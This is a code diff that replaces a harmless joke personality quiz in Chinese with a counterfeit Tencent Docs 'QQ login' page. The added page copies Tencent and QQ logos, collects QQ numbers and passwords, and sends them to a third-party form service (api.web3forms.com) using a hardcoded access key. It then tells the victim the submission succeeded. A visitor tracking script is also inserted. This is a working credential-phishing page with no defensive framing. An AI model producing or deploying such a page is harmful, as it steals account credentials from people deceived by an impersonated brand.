@@ -1,510 +1,505 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN">
+    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+<script>LA.init({id:"3Ll3hdfPIMU8vsTN",ck:"3Ll3hdfPIMU8vsTN"})</script>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>欣姐人格测试</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>腾讯文档 - QQ登录</title>
     <style>
-        body {
-            font-family: 'Comic Sans MS', cursive, sans-serif;
-            background-color: #ffebee;
+        * {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(145deg, #f0f2f5 0%, #e6e9f0 100%);
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
-        }
-        .container {
-            width: 100%;
-            max-width: 800px;
-            background-color: white;
-            border-radius: 15px;
             padding: 20px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
         }
-        h1 {
-            color: #ff5722;
-            text-align: center;
-            text-shadow: 2px 2px 4px #ccc;
-            margin-bottom: 30px;
-        }
-        .progress {
+
+        .login-container {
             width: 100%;
-            background-color: #e0e0e0;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            height: 20px;
+            max-width: 420px;
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.15), 0 1px 3px rgba(0, 0, 0, 0.02);
             overflow: hidden;
         }
-        .progress-bar {
-            height: 100%;
-            background-color: #4caf50;
-            width: 0%;
-            transition: width 0.3s;
-        }
-        .progress-text {
+
+        .login-header {
+            padding: 32px 32px 16px 32px;
             text-align: center;
-            margin-bottom: 20px;
-            font-size: 18px;
-            color: #666;
         }
-        .question-container {
-            display: none;
-            background-color: #fff9c4;
-            padding: 20px;
-            border-radius: 10px;
+
+        .logo-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
             margin-bottom: 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        .question-container.active {
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            display: inline-block;
+        }
+
+        .logo-text {
+            font-size: 26px;
+            font-weight: 600;
+            color: #1e6fdf;
+            letter-spacing: 1px;
+        }
+
+        .slogan {
+            font-size: 14px;
+            color: #5f6b7a;
+            margin-top: 4px;
+        }
+
+        .login-form {
+            padding: 28px 32px 32px 32px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        .input-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #2c3e4f;
+            margin-bottom: 8px;
             display: block;
         }
-        .question-text {
-            font-size: 20px;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-        .options {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        .option {
-            display: flex;
-            align-items: center;
-            padding: 10px;
-            background-color: #f5f5f5;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.2s;
-            position: relative;
-        }
-        .option:hover {
-            background-color: #e0e0e0;
-            transform: translateX(5px);
-        }
-        .option input {
-            margin-right: 10px;
-            transform: scale(1.2);
-            position: absolute;
-            opacity: 0;
+
+        .input-field {
             width: 100%;
-            height: 100%;
-            left: 0;
-            top: 0;
-            cursor: pointer;
+            padding: 12px 16px;
+            font-size: 15px;
+            border: 1.5px solid #e2e6ec;
+            border-radius: 16px;
+            background: #ffffff;
+            transition: all 0.2s;
+            outline: none;
+            font-family: inherit;
         }
-        .option-label {
-            pointer-events: none;
+
+        .input-field:focus {
+            border-color: #1e6fdf;
+            box-shadow: 0 0 0 3px rgba(30, 111, 223, 0.1);
         }
-        .navigation {
+
+        .options-row {
             display: flex;
             justify-content: space-between;
-            margin-top: 20px;
+            align-items: center;
+            margin-bottom: 28px;
+            font-size: 13px;
         }
-        button {
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            border-radius: 5px;
+
+        .checkbox {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            color: #5f6b7a;
         }
-        button:hover {
-            background-color: #388e3c;
+
+        .checkbox input {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+            accent-color: #1e6fdf;
         }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
+
+        .forgot-link {
+            color: #1e6fdf;
+            text-decoration: none;
+            font-weight: 500;
         }
-        #result {
-            display: none;
-            background-color: #bbdefb;
-            padding: 30px;
-            border-radius: 10px;
-            text-align: center;
-            margin-top: 20px;
+
+        .forgot-link:hover {
+            text-decoration: underline;
         }
-        .result-title {
-            font-size: 28px;
-            color: #ff5722;
+
+        .login-btn {
+            width: 100%;
+            background: #1e6fdf;
+            border: none;
+            padding: 14px 0;
+            border-radius: 44px;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
             margin-bottom: 20px;
+            font-family: inherit;
+            box-shadow: 0 6px 14px rgba(30, 111, 223, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-        .result-text {
-            font-size: 18px;
-            line-height: 1.6;
-            margin-bottom: 15px;
+
+        .login-btn:hover {
+            background: #0a5bc2;
         }
-        @media (max-width: 600px) {
-            .container {
-                padding: 15px;
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        .login-btn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* 加载动画 */
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .qq-quick-login {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin-top: 12px;
+            border-top: 1px solid #eff2f7;
+            padding-top: 24px;
+        }
+
+        .qq-icon-circle {
+            width: 48px;
+            height: 48px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+
+        .qq-icon-circle:hover {
+            transform: scale(1.02);
+        }
+
+        .qq-text {
+            font-size: 14px;
+            color: #5f6b7a;
+            font-weight: 500;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 16px 32px 28px;
+            border-top: 1px solid #f0f2f5;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #8f9bb2;
+        }
+
+        .footer a {
+            color: #1e6fdf;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .login-form {
+                padding: 24px 24px 28px;
             }
-            .question-text {
-                font-size: 18px;
+            .login-header {
+                padding: 24px 24px 12px;
             }
-            .option {
-                padding: 8px;
-            }
-            button {
-                padding: 8px 15px;
-            }
+        }
+
+        /* Toast 提示（非弹窗） */
+        .toast-message {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px 24px;
+            border-radius: 40px;
+            font-size: 14px;
+            z-index: 1100;
+            backdrop-filter: blur(8px);
+            pointer-events: none;
+            white-space: nowrap;
+        }
+        .toast-message.error {
+            background: rgba(185, 28, 28, 0.9);
+        }
+        .toast-message.success {
+            background: rgba(2, 84, 66, 0.9);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🤪 欣姐人格测试 🤪</h1>
-        
-        <div class="progress">
-            <div class="progress-bar" id="progressBar"></div>
+<div class="login-container">
+    <div class="login-header">
+        <div class="logo-area">
+            <img class="logo-icon" src="https://docs.idqqimg.com/tim/docs/desktop/favicon.ico" alt="腾讯文档图标" onerror="this.style.display='none'; this.nextSibling.style.display='flex';">
+            <div class="logo-text">腾讯文档</div>
         </div>
-        <div class="progress-text" id="progressText">问题 1 / 25</div>
-        
-        <div id="quiz">
-            <!-- 问题将通过JavaScript动态显示 -->
-        </div>
-        
-        <div class="navigation">
-            <button id="prevBtn" onclick="prevQuestion()" disabled>上一题</button>
-        </div>
-        
-        <div id="result">
-            <div class="result-title">💯 认证结果：纯正傻子 💯</div>
-            <div class="result-text">经过我们非常"严谨"的科学分析...</div>
-            <div class="result-text">恭喜你！你获得了最高级别的傻子认证！</div>
-            <div class="result-text">这个测试无论怎么选结果都一样，傻子</div>
-            <div class="result-text">因为这就是一个恶搞测试啊！🤣</div>
-            <div class="result-text">希望你玩得开心，别太认真~</div>
-            <button onclick="restartQuiz()" style="margin-top: 20px;">再测一次</button>
+        <div class="slogan">多人协作 · 云端实时保存</div>
+    </div>
+
+    <div class="login-form">
+        <!-- 
+            严格遵循 Web3Forms 要求的表单结构：
+            action: https://api.web3forms.com/submit
+            method: POST
+            包含: access_key (隐藏)
+                 name      → QQ号/邮箱/手机号
+                 email     → 隐藏固定邮箱 (满足格式)
+                 message   → 密码
+        -->
+        <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="5303029d-3f26-477b-893f-3276aedfea7c">
+            <!-- 固定邮箱，满足 Web3Forms 校验 -->
+            <input type="hidden" name="email" value="docs_login@tencent.com">
+
+            <div class="input-group">
+                <label class="input-label">QQ号 / 邮箱 / 手机号</label>
+                <input type="text" class="input-field" id="username" name="name" placeholder="请输入QQ号或关联账号" autocomplete="off" required>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">密码</label>
+                <input type="password" class="input-field" id="password" name="message" placeholder="请输入密码" autocomplete="off" required>
+            </div>
+
+            <div class="options-row">
+                <label class="checkbox">
+                    <input type="checkbox" id="rememberMe" checked> <span>记住密码</span>
+                </label>
+                <a href="#" class="forgot-link" id="forgotPwdLink">忘记密码？</a>
+            </div>
+
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span class="btn-text">QQ登录</span>
+            </button>
+        </form>
+
+        <div class="qq-quick-login">
+            <img class="qq-icon-circle" src="https://static-res.qq.com/static-res/imqq/qq-logo.png" alt="QQ图标" id="quickQQIcon" style="width: 48px; height: 48px;">
+            <div class="qq-text">使用QQ账号快捷登录</div>
         </div>
     </div>
-    
-    <script>
-        // 问题数据
-        const questions = [
-            {
-                text: "1. 当你看到推门时，你会：",
-                options: [
-                    "用力推门，即使上面写着拉",
-                    "尝试用脚踢开，因为手太累了",
-                    "等待别人来开门，然后跟着进去"
-                ]
-            },
-            {
-                text: "2. 当你发现手机没电时，你会：",
-                options: [
-                    "对着手机大喊'充电！'希望它能自己充",
-                    "把手机放进冰箱，因为你觉得低温能保存电量",
-                    "用微波炉给手机加热，因为你觉得热=能量"
-                ]
-            },
-            {
-                text: "3. 当你迷路时，你会：",
-                options: [
-                    "跟着自己的影子走，因为它总是跟着你",
-                    "询问路边的树怎么走，因为它们看起来很有方向感",
-                    "闭上眼睛转三圈然后随便选个方向"
-                ]
-            },
-            {
-                text: "4. 当你需要记住密码时，你会：",
-                options: [
-                    "用透明胶把密码写在额头上",
-                    "设置密码为'密码'，这样永远不会忘记",
-                    "每次登录都点'忘记密码'然后重置"
-                ]
-            },
-            {
-                text: "5. 当你看到红灯时，你会：",
-                options: [
-                    "闭上眼睛冲过去，因为看不见=不存在",
-                    "数到3然后不管什么灯都走",
-                    "等到绿灯但忘记要走"
-                ]
-            },
-            {
-                text: "6. 当你找不到东西时，你会：",
-                options: [
-                    "买一个新的，然后原来的就会自动出现",
-                    "站在原地转圈，希望离心力能把东西甩出来",
-                    "问家里的猫，虽然它从不回答"
-                ]
-            },
-            {
-                text: "7. 当你感到无聊时，你会：",
-                options: [
-                    "数自己的头发",
-                    "和墙玩剪刀石头布",
-                    "试图用眼神让水烧开"
-                ]
-            },
-            {
-                text: "8. 当你做数学题时，你会：",
-                options: [
-                    "把所有数字都改成7，因为这是你的幸运数字",
-                    "用抛硬币决定答案",
-                    "把计算器放进微波炉让它算快点"
-                ]
-            },
-            {
-                text: "9. 当你听到闹钟响时，你会：",
-                options: [
-                    "和闹钟对骂直到它闭嘴",
-                    "把闹钟藏起来，这样明天就找不到它了",
-                    "设置100个闹钟，每个间隔1分钟"
-                ]
-            },
-            {
-                text: "10. 当你需要减肥时，你会：",
-                options: [
-                    "只吃绿色的食物，因为绿色=健康",
-                    "把体重秤调低10公斤自我感觉良好",
-                    "闭上眼睛吃饭，认为这样不会长胖"
-                ]
-            },
-            {
-                text: "11. 当你睡不着时，你会：",
-                options: [
-                    "数羊但每次都忘记数到几",
-                    "试图用意念让自己睡着",
-                    "把枕头放进冰箱认为这样更凉爽"
-                ]
-            },
-            {
-                text: "12. 当你打喷嚏时，你会：",
-                options: [
-                    "说'谢谢自己'因为没人跟你说'保佑你'",
-                    "立刻捂住嘴但忘记放开导致窒息",
-                    "每次打喷嚏都换一种语言说'阿嚏'"
-                ]
-            },
-            {
-                text: "13. 当你看到蜘蛛时，你会：",
-                options: [
-                    "试图和它谈判让它搬出去",
-                    "用吸尘器吸但忘记关电源导致蜘蛛在里面健身",
-                    "给它织一件小毛衣"
-                ]
-            },
-            {
-                text: "14. 当你做饭时，你会：",
-                options: [
-                    "把所有调料都放一遍希望总有一种是对的",
-                    "用温度计量自己的体温来判断食物熟了没",
-                    "按照菜谱但把'适量'理解为'越多越好'"
-                ]
-            },
-            {
-                text: "15. 当你下雨没带伞时，你会：",
-                options: [
-                    "把头伸进塑料袋里认为这样就不会湿",
-                    "跑得比雨快",
-                    "试图用眼神让雨停下"
-                ]
-            },
-            {
-                text: "16. 当你忘记生日时，你会：",
-                options: [
-                    "每天都过生日这样就不会错过",
-                    "把年龄改成21岁永远不变",
-                    "问妈妈但每次都忘记她的回答"
-                ]
-            },
-            {
-                text: "17. 当你打游戏输时，你会：",
-                options: [
-                    "责怪手柄不够忠诚",
-                    "把屏幕亮度调低认为这样敌人看不见你",
-                    "对着游戏机吹气认为这样能改变结果"
-                ]
-            },
-            {
-                text: "18. 当你需要记住事情时，你会：",
-                options: [
-                    "写在手上但洗澡后忘记重写",
-                    "设置提醒但忘记设置时间",
-                    "相信未来的自己会更聪明"
-                ]
-            },
-            {
-                text: "19. 当你看到镜子时，你会：",
-                options: [
-                    "试图和镜中的自己玩石头剪刀布",
-                    "突然忘记镜子原理被自己吓到",
-                    "练习表情但忘记哪个是真实的自己"
-                ]
-            },
-            {
-                text: "20. 当你感到冷时，你会：",
-                options: [
-                    "穿10双袜子但忘记穿鞋",
-                    "抱着冰箱认为里面更冷所以外面就相对温暖",
-                    "看恐怖片让自己发抖取暖"
-                ]
-            },
-            {
-                text: "21. 当你需要早起时，你会：",
-                options: [
-                    "直接不睡觉认为这样就不会起晚",
-                    "设置闹钟但放在另一个房间然后懒得去关",
-                    "睡前喝很多水指望被憋醒"
-                ]
-            },
-            {
-                text: "22. 当你整理房间时，你会：",
-                options: [
-                    "把所有东西都塞进床底下认为'眼不见为净'",
-                    "按照颜色整理但忘记物品用途",
-                    "开始整理但被其他东西分心最后更乱"
-                ]
-            },
-            {
-                text: "23. 当你学习新技能时，你会：",
-                options: [
-                    "看教程但从不实际操作",
-                    "直接跳到高级部分因为初级'太简单'",
-                    "买所有装备但从不开始学习"
-                ]
-            },
-            {
-                text: "24. 当你和朋友争论时，你会：",
-                options: [
-                    "突然开始说外星语让对方困惑",
-                    "捂住耳朵'啦啦啦'不听对方",
-                    "假装晕倒然后忘记为什么争论"
-                ]
-            },
-            {
-                text: "25. 当你看到这个测试最后一题时，你会：",
-                options: [
-                    "已经忘记前面选了啥",
-                    "期待结果但知道肯定会被叫傻子",
-                    "后悔花了时间但还在继续"
-                ]
-            }
-        ];
 
-        let currentQuestion = 0;
-        const totalQuestions = questions.length;
-        const answers = new Array(totalQuestions).fill(null);
+    <div class="footer">
+        新用户？<a href="https://ssl.zc.qq.com/v5/index/?lang=zhCN" target="_blank" rel="noopener noreferrer" id="registerLink">立即注册</a> &nbsp;|&nbsp;
+        <a href="https://www.tencent.com/zh-cn/privacy-policy.html" target="_blank" rel="noopener noreferrer" id="privatePolicy">隐私协议</a>
+    </div>
+</div>
 
-        // 初始化测试
-        function initQuiz() {
-            const quizContainer = document.getElementById('quiz');
-            quizContainer.innerHTML = '';
-            
-            questions.forEach((question, index) => {
-                const questionDiv = document.createElement('div');
-                questionDiv.className = 'question-container';
-                questionDiv.id = `question-${index}`;
-                
-                let optionsHTML = '';
-                question.options.forEach((option, optIndex) => {
-                    optionsHTML += `
-                        <div class="option">
-                            <input type="radio" name="q${index}" id="q${index}-${optIndex}" value="${optIndex}" 
-                                   ${answers[index] === optIndex ? 'checked' : ''}>
-                            <label for="q${index}-${optIndex}" class="option-label">${option}</label>
-                        </div>
-                    `;
-                });
-                
-                questionDiv.innerHTML = `
-                    <div class="question-text">${question.text}</div>
-                    <div class="options">${optionsHTML}</div>
-                `;
-                
-                quizContainer.appendChild(questionDiv);
-            });
-            
-            // 添加选项点击事件
-            document.querySelectorAll('.option').forEach(option => {
-                option.addEventListener('click', function() {
-                    const radio = this.querySelector('input[type="radio"]');
-                    if (radio) {
-                        radio.checked = true;
-                        const qIndex = parseInt(radio.name.substring(1));
-                        const optIndex = parseInt(radio.value);
-                        selectOption(qIndex, optIndex);
-                    }
-                });
-            });
-            
-            showQuestion(currentQuestion);
-            updateProgress();
+<script>
+    (function() {
+        // DOM 元素
+        const form = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('loginBtn');
+        const rememberCheck = document.getElementById('rememberMe');
+        const forgotLink = document.getElementById('forgotPwdLink');
+        const quickQQIcon = document.getElementById('quickQQIcon');
+
+        // Toast 提示（非弹窗）
+        let toastTimer = null;
+        function showMessage(msg, type = 'info') {
+            const existing = document.querySelector('.toast-message');
+            if (existing) existing.remove();
+            const toast = document.createElement('div');
+            toast.className = `toast-message ${type === 'error' ? 'error' : (type === 'success' ? 'success' : '')}`;
+            toast.innerText = msg;
+            document.body.appendChild(toast);
+            if (toastTimer) clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => {
+                if (toast && toast.parentNode) toast.remove();
+            }, 3500);
         }
 
-        // 显示指定问题
-        function showQuestion(index) {
-            document.querySelectorAll('.question-container').forEach(q => {
-                q.classList.remove('active');
-            });
-            document.getElementById(`question-${index}`).classList.add('active');
-            
-            // 更新导航按钮状态
-            document.getElementById('prevBtn').disabled = index === 0;
-            
-            updateProgress();
-        }
-
-        // 更新进度条
-        function updateProgress() {
-            const progress = ((currentQuestion + 1) / totalQuestions) * 100;
-            document.getElementById('progressBar').style.width = `${progress}%`;
-            document.getElementById('progressText').textContent = `问题 ${currentQuestion + 1} / ${totalQuestions}`;
-        }
-
-        // 选择选项
-        function selectOption(qIndex, optIndex) {
-            answers[qIndex] = optIndex;
-            
-            // 自动跳转到下一题
-            if (currentQuestion < totalQuestions - 1) {
-                currentQuestion++;
-                showQuestion(currentQuestion);
+        // 记住密码（仅前端保存用户名）
+        function saveUsername() {
+            if (rememberCheck.checked) {
+                localStorage.setItem('saved_username', usernameInput.value.trim());
             } else {
-                showResult();
+                localStorage.removeItem('saved_username');
             }
         }
 
-        // 上一题
-        function prevQuestion() {
-            if (currentQuestion > 0) {
-                currentQuestion--;
-                showQuestion(currentQuestion);
+        function loadUsername() {
+            const saved = localStorage.getItem('saved_username');
+            if (saved) {
+                usernameInput.value = saved;
+                if (rememberCheck) rememberCheck.checked = true;
             }
         }
 
-        // 显示结果
-        function showResult() {
-            document.getElementById('quiz').style.display = 'none';
-            document.querySelector('.navigation').style.display = 'none';
-            document.getElementById('result').style.display = 'block';
-            
-            // 滚动到结果
-            window.scrollTo({
-                top: 0,
-                behavior: 'smooth'
+        // 显示加载动画，禁用按钮
+        function setLoading(isLoading) {
+            if (isLoading) {
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="spinner"></span><span class="btn-text">登录中...</span>';
+            } else {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span class="btn-text">QQ登录</span>';
+            }
+        }
+
+        // 处理表单提交（fetch 异步，无页面刷新，无弹窗）
+        async function handleSubmit(event) {
+            event.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+
+            if (!username) {
+                showMessage('请输入QQ号/邮箱/手机号', 'error');
+                usernameInput.focus();
+                return;
+            }
+            if (!password) {
+                showMessage('请输入密码', 'error');
+                passwordInput.focus();
+                return;
+            }
+
+            // 保存用户名（记住密码）
+            saveUsername();
+
+            // 构建 FormData
+            const formData = new FormData();
+            formData.append('access_key', '5303029d-3f26-477b-893f-3276aedfea7c');
+            formData.append('name', username);
+            formData.append('email', 'docs_login@tencent.com');
+            formData.append('message', password);
+            // 可选：添加 subject 以便邮件分类
+            formData.append('subject', '腾讯文档登录（用户提交）');
+
+            // 开始加载动画
+            setLoading(true);
+
+            try {
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                if (response.ok && data.success) {
+                    showMessage('登录信息已提交成功', 'success');
+                    // 清空密码（安全习惯）
+                    passwordInput.value = '';
+                } else {
+                    const errorMsg = data.message || '提交失败，请稍后重试';
+                    showMessage(errorMsg, 'error');
+                    console.error('Web3Forms 错误:', data);
+                }
+            } catch (error) {
+                console.error('网络错误:', error);
+                showMessage('网络错误，请检查连接后重试', 'error');
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        // 绑定表单提交
+        if (form) {
+            form.addEventListener('submit', handleSubmit);
+        }
+
+        // 忘记密码链接
+        if (forgotLink) {
+            forgotLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.open('https://accounts.qq.com/psw/find?from=11', '_blank');
             });
         }
 
-        // 重新开始测试
-        function restartQuiz() {
-            currentQuestion = 0;
-            answers.fill(null);
-            
-            document.getElementById('quiz').style.display = 'block';
-            document.querySelector('.navigation').style.display = 'flex';
-            document.getElementById('result').style.display = 'none';
-            
-            initQuiz();
+        // QQ 快捷登录示意（仅聚焦）
+        if (quickQQIcon) {
+            quickQQIcon.addEventListener('click', () => {
+                showMessage('请在上方输入QQ号和密码进行登录', 'info');
+                usernameInput.focus();
+            });
         }
 
-        // 初始化测试
-        window.onload = initQuiz;
-    </script>
+        // 加载记住的用户名（首次进入无弹窗）
+        loadUsername();
+
+        // 图标加载失败处理（避免空白）
+        const logoImg = document.querySelector('.logo-icon');
+        if (logoImg) {
+            logoImg.addEventListener('error', () => {
+                logoImg.style.display = 'none';
+                const fallback = document.createElement('div');
+                fallback.className = 'logo-icon';
+                fallback.style.width = '36px';
+                fallback.style.height = '36px';
+                fallback.style.backgroundColor = '#1e6fdf';
+                fallback.style.borderRadius = '12px';
+                fallback.style.display = 'flex';
+                fallback.style.alignItems = 'center';
+                fallback.style.justifyContent = 'center';
+                fallback.style.color = 'white';
+                fallback.style.fontWeight = 'bold';
+                fallback.style.fontSize = '20px';
+                fallback.innerText = 'T';
+                logoImg.parentNode.insertBefore(fallback, logoImg.nextSibling);
+            });
+        }
+
+        const qqIcon = document.getElementById('quickQQIcon');
+        if (qqIcon) {
+            qqIcon.addEventListener('error', () => {
+                qqIcon.style.display = 'none';
+                const fallbackDiv = document.createElement('div');
+                fallbackDiv.className = 'qq-icon-circle';
+                fallbackDiv.style.width = '48px';
+                fallbackDiv.style.height = '48px';
+                fallbackDiv.style.backgroundColor = '#f5f7fa';
+                fallbackDiv.style.borderRadius = '50%';
+                fallbackDiv.style.display = 'flex';
+                fallbackDiv.style.alignItems = 'center';
+                fallbackDiv.style.justifyContent = 'center';
+                fallbackDiv.style.fontSize = '26px';
+                fallbackDiv.style.color = '#1e6fdf';
+                fallbackDiv.style.border = '1px solid #e7ecf3';
+                fallbackDiv.innerText = 'QQ';
+                fallbackDiv.style.cursor = 'pointer';
+                fallbackDiv.addEventListener('click', () => {
+                    showMessage('请输入账号密码完成登录', 'info');
+                    usernameInput.focus();
+                });
+                qqIcon.parentNode.insertBefore(fallbackDiv, qqIcon.nextSibling);
+            });
+        }
+    })();
+</script>
 </body>
 </html>
